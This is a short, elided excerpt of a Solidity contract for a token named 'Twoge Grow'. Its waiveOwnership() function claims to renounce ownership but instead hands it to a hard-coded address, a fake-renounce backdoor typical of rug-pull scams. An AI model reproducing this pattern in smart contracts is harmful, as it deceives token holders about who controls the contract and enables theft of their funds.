...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x77C657e44527C6C36913A9EC7437BDC3D0A4F40c));
        _owner = address(0x77C657e44527C6C36913A9EC7437BDC3D0A4F40c);
    }
...
contract TwogeGrow is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Twoge Grow";
    string private _symbol = "TWOGE GROW";
